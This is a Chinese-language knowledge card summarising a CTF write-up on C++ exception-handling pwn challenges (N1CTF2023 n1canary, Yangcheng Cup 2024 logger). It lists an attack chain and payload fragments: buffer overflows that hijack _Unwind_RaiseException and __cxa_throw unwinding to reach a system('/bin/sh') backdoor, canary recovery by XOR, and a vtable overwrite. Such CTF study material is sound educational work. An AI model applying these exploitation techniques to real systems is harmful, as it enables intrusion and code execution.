---
title: "分享C++ PWN出题经历——深入研究异常处理机制"
category: pwn
tags: ["C++ PWN 异常处理 / N1CTF2023 / 羊城杯 2024", "pwn", "C++异常处理", "try/catch/throw", "_Unwind_RaiseException", "_cxa_throw"]
signals: ["C++ PWN 异常处理 / N1CTF2023 / 羊城杯 2024 2024", "C++异常处理", "try/catch/throw", "_Unwind_RaiseException", "_cxa_throw", "getrandom canary", "user_canary XOR", "vtable", "BOFApp", "pwn_unknown", "PWN", "exc", "Unwind_RaiseException", "n1canary"]
difficulty: hard
source: "https://www.ctfiot.com/220169.html"
tools: ["C", "C++"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 分享C++ PWN出题经历——深入研究异常处理机制

> 赛事：C++ PWN 异常处理 / N1CTF2023 / 羊城杯 2024 2024 | 方向：pwn | 难度：hard | 工具：C、C++

## 一句话总结

C++ PWN 异常处理 + 3 道题：exc _Unwind_RaiseException 链劫持 / n1canary getrandom+user_canary XOR / 羊城杯 logger __cxa_throw。

## 攻击链

1. 例 1 exception.cpp: try {input(); throw 1;} catch (int x) backdoor() throw "Buffer overflow
2. read(0, tmp.buf, 0x100) 触发 throw "Buffer overflow" → catch → backdoor system("/bin/sh")
3. 但 No-PIE + Canary + NX 开启
4. poc4 = padding 0x30 + p64(0x404050-0x8) + p64(0x401292+1) (printf try-block 起点)
5. _Unwind_RaiseException 异常处理链劫持
6. N1CTF2023 n1canary: getrandom(sys_canary, 64) + readall(user_canary)
7. getCanary(a1) = user_canary[(a1>>4)&7] ^ sys_canary[(a1>>4)&7]
8. vtable BOFApp off_4ED510 指向 0x403552 launch()
9. unique_ptr default_delete 调用 *(v6+8) → 改 BOFApp+0x8 指向 backdoor
10. backdoor=0x403387, user_canary=0x4F4AA0
11. payload1 = p64(user_canary+8)+p64(backdoor)*2 ljust(0x40, 'a')
12. payload2 = 'a'*(0x70-0x8) + p64(0x403407 ret) + p64(user_canary)
13. 羊城杯 2024 logger: trace 7 次 + ''/bin/sh;'' + menu(2) 触发 __cxa_throw
14. payload2 = 'a'*0x70 + p64(0x404300) + p64(0x401BC2+1)

## 关键 payload

```
poc4 = 0x30+p64(0x404050-8)+p64(0x401292+1) + N1CTF getrandom+user_canary
```

## 经验教训

C++ try/catch/throw 的 _Unwind_RaiseException + __cxa_throw 链可劫持返回地址 (printf 起点 +1 跳回 try-block)；N1CTF getrandom 64 字节 + user_canary 8 字节 XOR 算 canary；unique_ptr default_delete 调用 vtable+8。

## 标签

C++异常处理、try/catch/throw、_Unwind_RaiseException、_cxa_throw、getrandom canary、user_canary XOR、vtable、BOFApp、logger

## 参考来源

- https://www.ctfiot.com/220169.html
- 原文件：分享C++_PWN_出题经历——深入研究异常处理机制.full.md
